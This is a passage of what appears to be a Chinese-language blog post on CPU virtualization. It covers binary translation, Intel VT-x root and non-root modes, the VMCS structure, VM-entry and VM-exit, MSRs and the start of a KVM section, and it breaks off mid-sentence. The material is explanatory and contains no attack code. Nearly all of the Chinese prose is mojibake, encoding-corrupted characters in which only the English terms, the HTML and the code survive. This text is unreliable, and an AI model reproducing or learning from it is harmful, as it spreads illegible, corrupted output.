äºŒè¿›åˆ¶ç¿»è¯‘"></a>III. äºŒè¿›åˆ¶ç¿»è¯‘</h3><p>ä¸ºäº†è¿›ä¸€æ­¥åœ°æé«˜è™šæ‹ŸåŒ–çš„æ€§èƒ½ï¼Œ<strong>ã€ŒäºŒè¿›åˆ¶ä»£ç ç¿»è¯‘ã€</strong>ï¼ˆBinary Translationï¼‰æŠ€æœ¯åº”è¿è€Œç”Ÿï¼Œç±»ä¼¼äºã€Œæ‰«æ &amp; ä¿®è¡¥ã€æŠ€æœ¯ï¼ŒäºŒè¿›åˆ¶ä»£ç ç¿»è¯‘åŒæ ·ä¼šåœ¨è¿è¡Œæ—¶åŠ¨æ€åœ°ä¿®æ”¹ä»£ç ï¼Œä¸è¿‡ä¸åŒçš„æ˜¯ BT æŠ€æœ¯ä»¥<strong>åŸºæœ¬å—</strong>ï¼ˆåªæœ‰ä¸€ä¸ªå…¥å£å’Œä¸€ä¸ªå‡ºå£çš„ä»£ç å—ï¼‰ä½œä¸ºç¿»è¯‘çš„å•ä½ï¼š</p><ul><li>Emulator å¯¹è¯»å…¥çš„äºŒè¿›åˆ¶ä»£ç <strong>ç¿»è¯‘</strong>è¾“å‡ºä¸ºå¯¹åº” ISA çš„ä¸€ä¸ª<strong>ä¸åŒ…å«ç‰¹æƒæŒ‡ä»¤ä¸æ•æ„ŸæŒ‡ä»¤çš„å­é›†</strong>æ‰€æ„æˆçš„ä»£ç ï¼Œä½¿å…¶å¯ä»¥åœ¨ç”¨æˆ·æ€ä¸‹å®‰å…¨è¿è¡Œ</li><li>Emulator åŠ¨æ€åœ°ä¸ºå½“å‰è¦è¿è¡Œçš„åŸºæœ¬å—å¼€è¾Ÿä¸€å—ç©ºé—´ï¼Œç§°ä¹‹ä¸º<strong>ç¿»è¯‘ç¼“å­˜</strong>ï¼ˆtranslation cacheï¼‰ï¼Œåœ¨å…¶ä¸­å­˜æ”¾ç€ç¿»è¯‘åçš„ä»£ç ï¼Œæ¯ä¸€å— TC ä¸åŸä»£ç ä»¥æŸç§æ˜ å°„å…³ç³»ï¼ˆä¾‹å¦‚å“ˆå¸Œè¡¨ï¼‰è¿›è¡Œå…³è”</li></ul><p><img src="https://s2.loli.net/2022/08/14/hBFr6MSf5ZvtJkH.png" alt="image.png"></p><blockquote><p>æˆ‘ä»¬å¯ä»¥çœ‹å‡ºäºŒè¿›åˆ¶ä»£ç ç¿»è¯‘æŠ€æœ¯ä¸æ‰«æä¿®è¡¥æŠ€æœ¯çš„åŸç†å¤§ä½“ä¸Šæ˜¯éå¸¸ç±»ä¼¼çš„ï¼Œä½†æ˜¯äºŒè¿›åˆ¶ä»£ç ç¿»è¯‘æŠ€æœ¯ä¼šå¯¹æ‰€æœ‰çš„ä»£ç è¿›è¡Œç¿»è¯‘ï¼Œè€Œæ‰«æä¸ä¿®è¡¥æŠ€æœ¯åˆ™åªä¼š patch æ‰æ•æ„ŸæŒ‡ä»¤ä¸ç‰¹æƒæŒ‡ä»¤ï¼›åŒæ—¶æ‰«æ&amp;ä¿®è¡¥æŠ€æœ¯<strong>ä¸ä¼šæ”¹å˜ä»£ç çš„æ•´ä½“ç»“æ„</strong>ï¼Œè€Œä»…æ˜¯å°†æ•æ„Ÿä¸ç‰¹æƒæŒ‡ä»¤æ›¿æ¢ä¸ºèƒ½è§¦å‘é™·å…¥ VMM çš„æŒ‡ä»¤ï¼Œä½†æ˜¯äºŒè¿›åˆ¶ä»£ç ç¿»è¯‘æŠ€æœ¯<strong>ä¼šç›´æ¥æ”¹å˜ä¸€ä¸ªåŸºæœ¬å—çš„ä»£ç æ•´ä½“ç»“æ„</strong>ï¼ˆä¾‹å¦‚ç¿»è¯‘å‰åŸºæœ¬å—å¯èƒ½é•¿åº¦ 40Bï¼Œç¿»è¯‘åå˜æˆ100Bï¼Œå†…éƒ¨ä»£ç çš„ç›¸å¯¹ä½ç½®ä¹Ÿä¼šå‘ç”Ÿå˜åŒ–ï¼‰</p></blockquote><p>Emulator çš„ç¿»è¯‘æ–¹æ³•å¤§è‡´åˆ†ä¸ºä¸¤ç±»ï¼š<strong>ç®€å•ç¿»è¯‘</strong>ä¸<strong>ç­‰å€¼ç¿»è¯‘</strong>ï¼š</p><ul><li>ç®€å•ç¿»è¯‘å¯ä»¥ç›´æ¥ç†è§£ä¸º<strong>ç­‰æ•ˆä»£ç æ¨¡æ‹Ÿ</strong>ã€‚è¿™ç§æ–¹æ³•å®ç°è¾ƒä¸ºç®€å•ï¼Œä½†æ˜¯ä¼šè®©æŒ‡ä»¤æ•°é‡å¤§å¹…è†¨èƒ€</li><li>ç­‰å€¼ç¿»è¯‘åˆ™æ˜¯<strong>åŸä»£ç ä¸ç»“æœä»£ç ç›¸åŒ</strong>ã€‚ç†è®ºä¸Šå¤§å¤šæ•°æŒ‡ä»¤éƒ½å¯ä»¥ä½¿ç”¨ç­‰å€¼ç¿»è¯‘ç›´æ¥åœ¨ç¡¬ä»¶ä¸Šæ‰§è¡Œï¼Œä½†è¿™éœ€è¦æ›´å¤æ‚çš„åŠ¨æ€åˆ†ææŠ€æœ¯</li></ul><p>åœ¨ç›¸åŒ ISA æ¶æ„ä¸Šå¤§éƒ¨åˆ†æŒ‡ä»¤éƒ½æ˜¯å¯ä»¥ç›´æ¥è¿›è¡Œç­‰å€¼ç¿»è¯‘çš„ï¼Œé™¤äº†ä»¥ä¸‹å‡ ç§ï¼š</p><ul><li>PC ç›¸å¯¹å¯»å€æŒ‡ä»¤ã€‚è¿™ç±»æŒ‡ä»¤çš„å¯»å€ä¸ PC ç›¸å…³ï¼Œä½†åœ¨è¿›è¡ŒäºŒè¿›åˆ¶ç¿»è¯‘åæ›´æ”¹äº†ä»£ç åŸºæœ¬å—çš„ç»“æ„ï¼Œå› æ­¤è¿™ç±»æŒ‡ä»¤éœ€è¦é¢å¤–æ’å…¥ä¸€äº›è¡¥å¿ä»£ç æ¥ç¡®ä¿å¯»å€çš„å‡†ç¡®ï¼Œè¿™é€ æˆäº†ä¸€å®šçš„æ€§èƒ½æŸå¤±</li><li>ç›´æ¥æ§åˆ¶è½¬æ¢ã€‚è¿™ç±»æŒ‡ä»¤åŒ…æ‹¬å‡½æ•°è°ƒç”¨ä¸è·³è½¬æŒ‡ä»¤ï¼Œå…¶ç›®æ ‡åœ°å€éœ€è¦è¢«æ›¿æ¢ä¸ºç”Ÿæˆä»£ç çš„åœ°å€</li><li>é—´æ¥æ§åˆ¶è½¬æ¢ã€‚è¿™ç±»æŒ‡ä»¤åŒ…æ‹¬é—´æ¥è°ƒç”¨ã€è¿”å›ã€é—´æ¥è·³è½¬ï¼Œå…¶ç›®æ ‡åœ°å€æ˜¯åœ¨è¿è¡Œæ—¶åŠ¨æ€å¾—åˆ°çš„ï¼Œå› æ­¤æˆ‘ä»¬æ— æ³•åœ¨ç¿»è¯‘æ—¶ç¡®å®šè·³è½¬ç›®æ ‡</li><li>ç‰¹æƒæŒ‡ä»¤ã€‚å¯¹äºç®€å•çš„ç‰¹æƒæŒ‡ä»¤å¯ä»¥ç›´æ¥ç¿»è¯‘ä¸ºç±»ä¼¼çš„ç­‰å€¼ä»£ç ï¼ˆä¾‹å¦‚ cli æŒ‡ä»¤å¯ä»¥ç›´æ¥ç¿»è¯‘ä¸ºç½® vcpu çš„ flags å¯„å­˜å™¨çš„ IF ä½ä¸º0ï¼‰ï¼Œä½†å¯¹äºç¨å¾®å¤æ‚ä¸€ç‚¹çš„æŒ‡ä»¤ï¼Œåˆ™éœ€è¦è¿›è¡Œæ·±åº¦æ¨¡æ‹Ÿï¼Œåˆ©ç”¨è·³è½¬æŒ‡ä»¤é™·å…¥ VMM ä¸­ï¼Œè¿™é€šå¸¸ä¼šé€ æˆä¸€å®šçš„æ€§èƒ½å¼€é”€</li></ul><blockquote><p>ä¾‹å¦‚è¿™æ˜¯ Qemu ä¸­çš„ä¸€ä¸ªåŸºæœ¬å—ä»£ç ç¿»è¯‘çš„ä¾‹å­ï¼š</p><p><img src="https://s2.loli.net/2022/08/14/ZSNn8iyCG9Tove6.png" alt="image.png"></p></blockquote><p>ç”±äºäºŒè¿›åˆ¶ä»£ç ç¿»è¯‘æŠ€æœ¯ä½¿ç”¨äº†æ›´ä¸ºå¤æ‚çš„è¿‡ç¨‹ï¼Œç”±æ­¤ä¹Ÿä¼šå¼•å…¥æ›´å¤šçš„é—®é¢˜ï¼Œå¯¹äºä»¥ä¸‹æƒ…å½¢åˆ™éœ€è¦é¢å¤–çš„å¤„ç†ï¼š</p><ul><li>è‡ªä¿®æ”¹ä»£ç ï¼ˆSelf Modifying Codeï¼‰ã€‚è¿™ç±»ç¨‹åºä¼šåœ¨è¿è¡Œæ—¶ä¿®æ”¹è‡ªèº«æ‰€æ‰§è¡Œçš„ä»£ç ï¼Œè¿™éœ€è¦æˆ‘ä»¬çš„ Emulator å¯¹æ–°ç”Ÿæˆçš„ä»£ç è¿›è¡Œé‡ç¿»è¯‘</li><li>è‡ªå‚è€ƒä»£ç ï¼ˆSelf Referential Codeï¼‰ã€‚è¿™ç±»ç¨‹åºä¼šåœ¨è¿è¡Œä¸­è¯»å–è‡ªå·±çš„ä»£ç æ®µä¸­å†…å®¹ï¼Œè¿™éœ€è¦æˆ‘ä»¬é¢å¤–è¿›è¡Œå¤„ç†ï¼Œä½¿å…¶è¯»å–åŸä»£ç æ®µä¸­å†…å®¹è€Œéç¿»è¯‘åçš„ä»£ç </li><li>ç²¾ç¡®å¼‚å¸¸ï¼ˆPrecise Exceptionsï¼‰ã€‚å³åœ¨ç¿»è¯‘ä»£ç æ‰§è¡Œçš„è¿‡ç¨‹ä¸­å‘ç”Ÿäº†ä¸­æ–­æˆ–å¼‚å¸¸ï¼Œè¿™éœ€è¦å°†è¿è¡ŒçŠ¶æ€æ¢å¤åˆ°åŸä»£ç æ‰§è¡Œåˆ°å¼‚å¸¸ç‚¹æ—¶çš„çŠ¶æ€ï¼Œä¹‹åå†äº¤ç»™ Guest OS å¤„ç†ã€‚BT æŠ€æœ¯æš‚å¾ˆéš¾å¾ˆå¥½åœ°å¤„ç†è¿™ç§æƒ…å†µï¼Œå› ä¸ºç¿»è¯‘åçš„ä»£ç ä¸åŸä»£ç å·²ç»å¤±å»äº†é€æ¡å¯¹åº”çš„å…³ç³»ã€‚ä¸€ä¸ªå¯è¡Œçš„è§£å†³æ–¹æ¡ˆå°±æ˜¯åœ¨å‘ç”Ÿå¼‚å¸¸æ—¶è¿›è¡Œå›æ»šï¼Œä¹‹åé‡æ–°ä½¿ç”¨è§£é‡Šæ‰§è¡Œçš„æ–¹å¼</li><li>å®æ—¶ä»£ç ã€‚è¿™ç±»ä»£ç å¯¹äºå®æ—¶æ€§è¦æ±‚è¾ƒé«˜ï¼Œåœ¨æ¨¡æ‹Ÿç¯å¢ƒä¸‹è¿è¡Œä¼šæŸå¤±æ—¶é—´ç²¾ç¡®æ€§ï¼Œç›®å‰æš‚æ—¶æ— æ³•è§£å†³</li></ul><h2 id="äºŒã€ç¡¬ä»¶è¾…åŠ©è™šæ‹ŸåŒ–-Intel-VT-x"><a href="#äºŒã€ç¡¬ä»¶è¾…åŠ©è™šæ‹ŸåŒ–-Intel-VT-x" class="headerlink" title="äºŒã€ç¡¬ä»¶è¾…åŠ©è™šæ‹ŸåŒ– - Intel VT-x"></a>äºŒã€ç¡¬ä»¶è¾…åŠ©è™šæ‹ŸåŒ– - Intel VT-x</h2><blockquote><p><del>å¬è¯´ç¡¬ä»¶è¾…åŠ©è™šæ‹ŸåŒ–ä¸€å‡ºæ¥ Xen å°±æ²¡äººç”¨äº†</del></p></blockquote><h3 id="I-æ¦‚è¿°"><a href="#I-æ¦‚è¿°" class="headerlink" title="I. æ¦‚è¿°"></a>I. æ¦‚è¿°</h3><p>Intel VT æŠ€æœ¯æ˜¯ Intel ä¸º x86 è™šæ‹ŸåŒ–æ‰€æä¾›çš„ç¡¬ä»¶æ”¯æŒï¼Œå…¶ä¸­ç”¨äºè¾…åŠ© CPU è™šæ‹ŸåŒ–çš„æ˜¯ <code>Intel VT-x</code> æŠ€æœ¯ï¼Œå…¶æ‰©å±•äº†ä¼ ç»Ÿçš„ IA32 å¤„ç†å™¨æ¶æ„ï¼Œä¸º IA32 æ¶æ„çš„ CPU è™šæ‹ŸåŒ–æä¾›äº†ç¡¬ä»¶æ”¯æŒ</p><p>VT-x æŠ€æœ¯ä¸º Intel CPU é¢å¤–å¼•å…¥äº†ä¸¤ç§è¿è¡Œæ¨¡å¼ï¼Œç»Ÿç§°ä¸º<strong>ã€ŒVMX æ“ä½œæ¨¡å¼ã€</strong>ï¼ˆVirtual Machine eXtensionsï¼‰ï¼Œé€šè¿‡ <code>vmxon</code> æŒ‡ä»¤å¼€å¯ï¼Œè¿™ä¸¤ç§è¿è¡Œæ¨¡å¼<strong>éƒ½ç‹¬ç«‹æœ‰ç€è‡ªå·±çš„åˆ†çº§ä¿æŠ¤ç¯</strong>ï¼š</p><ul><li><code>VMX Root Operation</code>ï¼šHypervisor æ‰€å·¥ä½œçš„æ¨¡å¼ï¼Œåœ¨è¿™ä¸ªæ¨¡å¼ä¸‹å¯ä»¥è®¿é—®è®¡ç®—æœºçš„æ‰€æœ‰èµ„æºï¼Œå¹¶å¯¹ VM è¿›è¡Œè°ƒåº¦</li><li><code>VMX Non-Root Operation</code>ï¼šVM æ‰€å·¥ä½œçš„æ¨¡å¼ï¼Œåœ¨è¿™ä¸ªæ¨¡å¼ä¸‹ä»…èƒ½è®¿é—®éæ•æ„Ÿèµ„æºï¼Œå¯¹äºæ•æ„Ÿèµ„æºçš„è®¿é—®ï¼ˆä¾‹å¦‚ I&#x2F;O æ“ä½œï¼‰ä¼šä½¿å¾— CPU é€€å‡º Non-Root æ¨¡å¼å¹¶é™·å…¥ Hypervisor ä¸­ï¼Œç”± Hypervisor å¤„ç†åå†é‡æ–°è¿›å…¥ Non-Root æ¨¡å¼æ¢å¤ VM çš„è¿è¡Œ</li></ul><p>ç”±æ­¤ï¼Œæˆ‘ä»¬å¯¹ Root æ¨¡å¼ä¸ Non-Root æ¨¡å¼é—´çš„åˆ‡æ¢è¡Œä¸ºè¿›è¡Œå®šä¹‰ï¼š</p><ul><li><code>VM-Entry</code>ï¼šHypervisor ä¿å­˜è‡ªèº«çŠ¶æ€ä¿¡æ¯ï¼Œåˆ‡æ¢åˆ° VMX Non-Root æ¨¡å¼ï¼Œè½½å…¥ VM çŠ¶æ€ä¿¡æ¯ï¼Œæ¢å¤ VM æ‰§è¡Œæµ</li><li><code>VM-Exit</code>ï¼šVM è¿è¡Œæš‚åœå¹¶ä¿å­˜è‡ªèº«çŠ¶æ€ä¿¡æ¯ï¼Œåˆ‡æ¢åˆ° VMX Root æ¨¡å¼ï¼Œè½½å…¥ Hypervisor çŠ¶æ€ä¿¡æ¯ï¼Œæ‰§è¡Œç›¸åº”çš„å¤„ç†å‡½æ•°</li></ul><p><img src="https://s2.loli.net/2022/08/11/uzmNXaOP6HSVqFL.png" alt="image.png"></p><p>ç”±äº Non-Root æ¨¡å¼ä¸ Root æ¨¡å¼éƒ½å„è‡ªæœ‰ç€è‡ªå·±çš„åˆ†çº§ä¿æŠ¤ç¯ï¼Œå› æ­¤ Host OS ä¸ Guest OS éƒ½å¯ä»¥<strong>ä¸åŠ ä¿®æ”¹åœ°åœ¨è‡ªå·±å¯¹åº”çš„æ¨¡å¼ä¸‹ç›´æ¥åœ¨ç¡¬ä»¶ä¸Šè¿è¡Œ</strong>ï¼Œä»…æœ‰å½“ Guest OS æ¶‰åŠåˆ°æ•æ„Ÿèµ„æºçš„è®¿é—®åŠ Host OS å¯¹ VM çš„è°ƒåº¦æ—¶æ‰ä¼šå‘ç”Ÿåˆ‡æ¢ï¼Œè¿™åœ¨ç¡®ä¿äº† VM é«˜æ€§èƒ½çš„åŒæ—¶æ»¡è¶³äº†ã€ŒTrap &amp; Emulateã€æ¨¡å‹å®ç°ï¼Œä¹Ÿè§£å†³äº† x86 æ¶æ„çš„è™šæ‹ŸåŒ–æ¼æ´</p><h3 id="II-VMCS"><a href="#II-VMCS" class="headerlink" title="II. VMCS"></a>II. VMCS</h3><p>åœ¨ Intel VT-x æŠ€æœ¯å¼•å…¥äº†<code>VMCS</code>ï¼ˆ<strong>Virtual-Machine Control Structure</strong>ï¼‰ï¼Œç”¨ä»¥ä¿å­˜ CPU è™šæ‹ŸåŒ–æ‰€éœ€è¦çš„ç›¸å…³çŠ¶æ€ï¼Œ<strong>æ¯ä¸ª virtual CPU å¯¹åº”æœ‰ä¸€ä¸ª VMCS</strong></p><p>VMCS ä¸ç‰©ç† CPU æ˜¯<strong>ä¸€ä¸€å¯¹åº”çš„ç»‘å®šå…³ç³»</strong>ï¼Œå³åœ¨åŒä¸€æ—¶åˆ»ä¸€ä¸ªç‰©ç† CPU åªèƒ½ä¸ä¸€ä¸ª VMCS ç»‘å®šï¼Œåä¹‹äº¦ç„¶ï¼Œä½†åœ¨ä¸åŒçš„æ—¶åˆ»æˆ‘ä»¬å¯ä»¥å°† VMCS ç»‘å®šåˆ°ä¸åŒçš„ç‰©ç† CPU ä¸Šï¼Œç§°ä¹‹ä¸º VMCS çš„<strong>è¿ç§»</strong>ï¼ˆMigrationï¼‰</p><p>ä¸ VMCS çš„ç»‘å®šä¸è§£ç»‘ç›¸å…³çš„æ˜¯ä»¥ä¸‹ä¸¤æ¡æŒ‡ä»¤ï¼š</p><table><thead><tr><th align="center">Instruction</th><th align="center">Description</th></tr></thead><tbody><tr><td align="center">VMPTRLD &lt;VMCS åœ°å€&gt;</td><td align="center">å°†æŒ‡å®šçš„ VMCS ä¸æ‰§è¡Œè¯¥æŒ‡ä»¤çš„ CPU è¿›è¡Œç»‘å®š</td></tr><tr><td align="center">VMCLEAR</td><td align="center">å°†æ‰§è¡Œè¯¥æŒ‡ä»¤çš„ CPU ä¸å…¶ VMCS è¿›è¡Œè§£ç»‘</td></tr></tbody></table><p>VT-x ä¸­å°† VMCS å®šä¹‰ä¸ºä¸€ä¸ª<strong>æœ€å¤§ä¸è¶…è¿‡ 4KB çš„å†…å­˜å—ï¼Œä¸”åº”ä¸ 4KB å¯¹é½</strong>ï¼Œå…¶å†…å®¹æ ¼å¼å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VMCS</span> &#123;</span><br>    <span class="hljs-comment">/* ç‰ˆæœ¬å·ï¼Œ4å­—èŠ‚ */</span><br><span class="hljs-type">uint32_t</span> vmcs_revision_identifier:<span class="hljs-number">31</span>, shadow_vmcs_indicator:<span class="hljs-number">1</span>;<br>    <br>    <span class="hljs-comment">/* ä¸­æ­¢æ ‡è¯†ï¼Œ4å­—èŠ‚</span><br><span class="hljs-comment">     * å½“ VM-Exit å¤±è´¥æ—¶ä¾¿ä¼šäº§ç”Ÿ VMX ä¸­æ­¢ï¼Œå¹¶åœ¨æ­¤å¤„å­˜æ”¾åŸå› </span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-type">uint32_t</span> vmx_abort_indicator;<br>    <br>    <span class="hljs-comment">/* æ•°æ®åŸŸ */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VMCSData</span> <span class="hljs-title">vmcs_data</span>;</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>VMCS æ•°æ®åŸŸ å­˜æ”¾ç€ VMCS ä¸»è¦çš„ä¿¡æ¯ï¼Œåˆ†ä¸ºä»¥ä¸‹å…­ä¸ªå­åŸŸï¼š</p><ul><li><p><strong>Guest-state area</strong>ï¼šä¿å­˜ VM å¯„å­˜å™¨çŠ¶æ€ï¼Œåœ¨ VM-entry æ—¶åŠ è½½ï¼Œåœ¨ VM-exit æ—¶ä¿å­˜</p></li><li><p><strong>Host-state area</strong>ï¼šä¿å­˜ Hypervisor å¯„å­˜å™¨çŠ¶æ€ï¼Œåœ¨ VM-exit æ—¶åŠ è½½</p><p><img src="https://s2.loli.net/2022/08/15/C8wMpWE5X7S1KYP.png" alt="image.png"></p></li><li><p><strong>VM-execution control fileds</strong>ï¼šæ§åˆ¶ <code>Non-Root</code> æ¨¡å¼ä¸‹çš„å¤„ç†å™¨è¡Œä¸º </p></li><li><p><strong>VM-entry  control fileds</strong>ï¼šæ§åˆ¶ <code>VM-Entry</code> è¿‡ç¨‹ä¸­çš„æŸäº›è¡Œä¸º</p></li><li><p><strong>VM-exit  control fileds</strong>ï¼šæ§åˆ¶ <code>VM-Exit</code> è¿‡ç¨‹ä¸­çš„æŸäº›è¡Œä¸º</p></li><li><p><strong>VM-exit information fields</strong>ï¼šä¿å­˜ <code>VM-Exit</code> çš„åŸºæœ¬åŸå› åŠå…¶ä»–è¯¦ç»†ä¿¡æ¯ï¼Œåœ¨ä¸€äº›å¤„ç†å™¨ä¸Šè¯¥åŸŸä¸ºåªè¯»åŸŸ</p><p><img src="https://s2.loli.net/2022/08/15/jqQDsA6UHZ7wy8z.png" alt="image.png"></p></li></ul><p>æˆ‘ä»¬é€šè¿‡ä»¥ä¸‹ä¸¤æ¡æŒ‡ä»¤è¯»å†™ VMCSï¼š</p><table><thead><tr><th align="center">Instruction</th><th align="center">Description</th></tr></thead><tbody><tr><td align="center">VMREAD &lt;ç´¢å¼•&gt;</td><td align="center">è¯» VMCS ä¸­â€œç´¢å¼•â€æŒ‡å®šçš„åŸŸ</td></tr><tr><td align="center">VMWRITE &lt;ç´¢å¼•&gt; &lt;æ•°æ®&gt;</td><td align="center">å‘ VMCS ä¸­â€œç´¢å¼•â€æŒ‡å®šçš„åŸŸå†™å…¥æ•°æ®</td></tr></tbody></table><blockquote><p>è¿™é‡Œçš„ç´¢å¼•å¹¶éåç§»å€¼ï¼Œè€Œæ˜¯ Intel ä¸ºæ•°æ®åŸŸä¸­æ¯ä¸ªå­—æ®µéƒ½å®šä¹‰äº†ä¸€ä¸ªç‹¬ç‰¹çš„ç´¢å¼•å€¼ï¼Œä¾‹å¦‚ Guest State Area ä¸­ ES æ®µé€‰æ‹©å­çš„ç´¢å¼•å€¼ä¾¿æ˜¯ <code>0x00000800</code></p><p>å½“ç„¶ï¼Œè¦æŠŠæ‰€æœ‰åŸŸçš„ç´¢å¼•éƒ½èƒŒä¸‹æ¥å¹¶ä¸ç°å®ï¼Œæœ€å¥½çš„åŠæ³•è¿˜æ˜¯å¤šå¤šæŸ¥è¡¨ï¼šï¼‰æ¨èé˜…è¯»ï¼š<a href="https://www.intel.com/content/www/us/en/developer/articles/technical/intel-sdm.html">Intel SDM</a> çš„ <a href="https://cdrdv2.intel.com/v1/dl/getContent/671506">IntelÂ® 64 and IA-32 Architectures Software Developerâ€™s Manual Volume 3C: System Programming Guide, Part 3</a></p></blockquote><h3 id="III-VMX-æ“ä½œæ¨¡å¼"><a href="#III-VMX-æ“ä½œæ¨¡å¼" class="headerlink" title="III. VMX æ“ä½œæ¨¡å¼"></a>III. VMX æ“ä½œæ¨¡å¼</h3><p>ä½œä¸ºä¼ ç»Ÿçš„ IA32 æ¶æ„çš„æ‰©å±•ï¼ŒVMX æ“ä½œæ¨¡å¼åœ¨é»˜è®¤ä¸‹æ˜¯å…³é—­çš„ï¼Œåªæœ‰å½“ VMM éœ€è¦ä½¿ç”¨ç¡¬ä»¶è¾…åŠ©è™šæ‹ŸåŒ–åŠŸèƒ½æ—¶æ‰ä¼šä½¿ç”¨ Intel æä¾›çš„ä¸¤æ¡æ–°æŒ‡ä»¤æ¥å¼€å…³ VMX æ“ä½œæ¨¡å¼ï¼š</p><ul><li><code>VMXON</code>ï¼šå¼€å¯ VMX æ“ä½œæ¨¡å¼</li><li><code>VMXOFF</code>ï¼šå…³é—­ VMX æ“ä½œæ¨¡å¼</li></ul><p>åœ¨ Intel SDM ä¸­æè¿°çš„ VMX ç”Ÿå‘½å‘¨æœŸå¦‚ä¸‹ï¼š</p><ul><li>è½¯ä»¶é€šè¿‡ <code>VMXON</code> æŒ‡ä»¤è¿›å…¥ VMX æ“ä½œæ¨¡å¼</li><li>VMM å¯ä»¥é€šè¿‡ <code>VM entries</code> è¿›å…¥ Guest VMï¼ˆå•æ¬¡åªèƒ½æ‰§è¡Œä¸€ä¸ª VMï¼‰ï¼ŒVMM é€šè¿‡ <code>VMLAUNCH</code> ï¼ˆç¬¬ä¸€æ¬¡è¿›å…¥ VMï¼‰ä¸ <code>VMRESUME</code> ï¼ˆä» VMM ä¸­æ¢å¤åˆ° VMï¼‰æŒ‡ä»¤æ¥ä½¿èƒ½ <code>VM entry</code>ï¼Œé€šè¿‡ <code>VM exits</code> é‡è·æ§åˆ¶æƒ</li><li><code>VM exits</code> é€šè¿‡ VMM æŒ‡å®šçš„å…¥å£ç‚¹ç§»äº¤æ§åˆ¶æƒï¼ŒVMM å¯¹ VM çš„é€€å‡ºåŸå› è¿›è¡Œå“åº”åé€šè¿‡ <code>VM entry</code> è¿”å›åˆ° VM ä¸­</li><li>å½“ VMM æƒ³è¦åœæ­¢è‡ªèº«è¿è¡Œå¹¶é€€å‡º VMX æ“ä½œæ¨¡å¼æ—¶ï¼Œå…¶é€šè¿‡ <code>VMXOFF</code> æŒ‡ä»¤æ¥å®Œæˆ</li></ul><p><img src="https://s2.loli.net/2022/09/05/FXCzMI3N4JafQRe.png" alt="image.png"></p><p>ç°åœ¨æˆ‘ä»¬æ¥æ·±å…¥ <code>VM entry</code> ä¸ <code>VM exit</code> è¿™ä¸¤ä¸ªè¡Œä¸ºçš„å®ç°ç»†èŠ‚ä¸­ï¼Œåœ¨å…¶æµç¨‹ä¸­ä»–ä»¬åˆ†åˆ«è¿›è¡Œäº†å¦‚ä¸‹åŠ¨ä½œï¼š</p><ul><li><strong>VM entry</strong>ï¼šä» Hypervisor åˆ‡æ¢åˆ° VM<ul><li>æ£€æŸ¥ VMCS åˆæ³•æ€§ï¼ˆå„å­—æ®µå€¼æ˜¯å¦åˆæ³•ï¼‰</li><li>åŠ è½½ VMCS çš„ <code>Guest-state area</code> ä¸­çš„å„å­—æ®µåˆ°å¯¹åº”çš„å¯„å­˜å™¨</li><li>åŠ è½½æŒ‡å®šçš„ MSR</li><li>è®¾ç½® VMCS çš„çŠ¶æ€ä¸º <code>launched</code></li><li>æ ¹æ®éœ€è¦é€šè¿‡å†™ VMCS çš„ <code>VM-entry Interrucption-Information</code> å‘ VM è¿›è¡Œ<strong>äº‹ä»¶æ³¨å…¥</strong>ï¼ˆå¦‚å¼‚å¸¸ã€å¼‚æ­¥ä¸­æ–­ç­‰ï¼‰</li></ul></li><li><strong>VM exit</strong>ï¼šä» VM åˆ‡æ¢åˆ° Hypervisor<ul><li>å°† VM é€€å‡ºçš„åŸå› ä¸è¯¦ç»†ä¿¡æ¯å†™å…¥ VMCS çš„  <code>VM-exit information fields</code></li><li>å°† VM çš„å¯„å­˜å™¨ä¿å­˜è‡³ VMCS çš„ <code>Guest-state area</code> </li><li>ä» VMCS çš„ <code>Host-state area</code> ä¸­æ¢å¤ Host å¯„å­˜å™¨</li><li>åŠ è½½æŒ‡å®š MSR</li></ul></li></ul><p><img src="https://s2.loli.net/2022/08/11/vzj8dDtgLk2JI6Q.png" alt="image.png"></p><blockquote><p>è¿™é‡Œç¬”è€…ä¸ºå¤§å®¶è¡¥å……ä¸€ä¸ªæ¦‚å¿µï¼š<strong>Model Specific Register</strong>ï¼Œç®€ç§° MSRï¼Œæ˜¯ x86 ä¸‹çš„ä¸€ç»„ç”¨æ¥<strong>æ§åˆ¶CPUè¿è¡Œã€åŠŸèƒ½å¼€å…³ã€è°ƒè¯•ã€è·Ÿè¸ªç¨‹åºæ‰§è¡Œã€ç›‘æµ‹CPUæ€§èƒ½</strong>ç­‰æ–¹é¢çš„å¯„å­˜å™¨</p><blockquote><p>ä¾‹å¦‚ <code>syscall</code> æŒ‡ä»¤ä¾¿æ˜¯é€šè¿‡ MSR å¯„å­˜å™¨æ¥è·å–åˆ°å†…æ ¸ç³»ç»Ÿè°ƒç”¨çš„å…¥å£ç‚¹</p></blockquote><p>æ¯ä¸ª MSR å¯„å­˜å™¨éƒ½ä¼šæœ‰ä¸€ä¸ª idï¼Œç§°ä¹‹ä¸º <code>MSR Index</code>ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸ª id æ¥åˆ©ç”¨ <code>RDMSR</code> ä¸ <code>WRMSR</code> æŒ‡ä»¤è¯»å†™æŒ‡å®šçš„ MSR å¯„å­˜å™¨</p><p>æˆ‘ä»¬å¯ä»¥åœ¨ Intel SDM çš„ Volume 4 ä¸­è·å–åˆ°åˆ° MSR å¯„å­˜å™¨çš„è¯¦ç»†ä¿¡æ¯</p></blockquote><h2 id="ä¸‰ã€KVM-amp-QEMU-KVM"><a href="#ä¸‰ã€KVM-amp-QEMU-KVM" class="headerlink" title="ä¸‰ã€KVM &amp; QEMU-KVM"></a>ä¸‰ã€KVM &amp; QEMU-KVM</h2><p>ä¸‹é¢æˆ‘ä»¬æ¥ä»‹ç» KVMâ€”â€”<strong>Kernel-based Virtual Machine</strong>ï¼Œæ˜¯ä¸€ä¸ªè‡ª Linux 2.6.20 åé›†æˆåœ¨ kernel ä¸­çš„ä¸€ä¸ª<strong>å¼€æºç³»ç»Ÿè™šæ‹ŸåŒ–å†…æ 